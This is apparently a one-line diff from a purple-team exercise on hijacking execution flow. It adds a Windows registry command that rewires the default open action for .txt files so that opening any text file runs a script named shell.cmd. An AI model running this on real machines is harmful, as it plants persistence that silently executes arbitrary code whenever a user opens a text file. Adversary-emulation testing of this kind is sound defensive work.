@@ -1,0 +1,1 @@
+reg add HKCR\txtfile\shell\open\command /t REG_EXPAND_SZ /d "D:\shared-data\purple\20210106\5. Hijack execution flow\shell.cmd %%1" /f
